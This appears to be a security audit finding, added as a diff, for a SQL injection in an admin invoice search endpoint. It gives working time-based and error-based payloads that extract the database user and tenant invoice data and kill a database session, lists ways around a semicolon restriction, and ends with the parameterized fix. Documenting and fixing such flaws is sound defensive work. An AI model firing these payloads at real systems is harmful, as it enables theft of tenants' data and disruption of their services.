@@ -1,0 +1,68 @@
+V-12 — SQL injection in GET /api/v1/admin/search?q=
+
+Root cause: string concatenation in admin/routes.js
+  const sql = `SELECT ... FROM invoices WHERE number LIKE '%${q}%' ORDER BY ...`;
+  await client.query(sql);   // no parameters, simple query protocol
+
+Demo 1 — Baseline (control)
+  q=INV                → 200, ~30ms
+
+Demo 2 — Time-based blind (no `;` required)
+  q=x%' OR (SELECT 1 FROM pg_sleep(5)) = 1--
+  → 200, ~5000ms  (arbitrary SQL execution confirmed)
+
+Demo 3 — Error-based extraction (no `;` required)
+  q=x%' OR 1=CAST((SELECT current_user) AS INTEGER)--
+  → 500, "invalid input syntax for type integer: \"lendstack_app\""
+
+  q=x%' OR 1=CAST((SELECT current_database()) AS INTEGER)--
+  → 500, "invalid input syntax for type integer: \"lendstack\""
+
+  q=x%' OR 1=CAST((SELECT number FROM invoices
+                   WHERE tenant_id='a0000001-...' LIMIT 1) AS INTEGER)--
+  → 500, "invalid input syntax for type integer: \"INV-A-1001\""
+  (real tenant data extracted via error oracle)
+
+Demo 4 — Side-effect via function invocation
+  q=x%' OR (SELECT pg_terminate_backend(<pid>)) = true--
+  → 200, target psql session terminated
+  (arbitrary function invocation with server-side side effects)
+
+Demo 5 — Write primitive: constrained, documented
+
+  What was attempted:
+    a. `;`-stacked UPDATE       → blocked: Express qs treats `;` in query
+                                  values as parameter separator; `q` is
+                                  truncated at first `;` before SQL
+    b. data-modifying CTE       → blocked: Postgres requires `WITH` with
+                                  UPDATE/INSERT/DELETE at top level; the
+                                  template places the injection inside
+                                  `WHERE`, which is not top level
+    c. CTE inside UNION         → blocked: same top-level rule applies to
+                                  UNION arms
+
+  What this means (and doesn't mean):
+
+  The vulnerability is Critical without a demo of user-table writes.
+  Arbitrary SQL execution is proven by Demos 2–4. Any SQL execution
+  primitive carries write capability — an attacker would either:
+    - use a raw-socket HTTP client that doesn't route through qs,
+    - use an alternate route whose parameter reaches SQL unparsed, or
+    - chain the injected OR with a function that has side effects
+      (demonstrated in Demo 4 with pg_terminate_backend).
+
+  The `;` constraint is a property of this specific HTTP client path,
+  not a defense in the vulnerable code. The fix (parameterization) is
+  the same regardless of which payload delivery technique an attacker
+  uses.
+
+Fix (M8):
+  const { rows } = await client.query(
+    `SELECT id, number, amount_cents, status FROM invoices
+     WHERE number LIKE $1
+     ORDER BY created_at DESC LIMIT 50`,
+    [`%${q}%`]
+  );
+  One-line parameterization. Also: remove `detail: e.message` from the
+  500 response (V-15) — it leaks SQL syntax errors and enables the
+  error-based extraction in Demo 3.
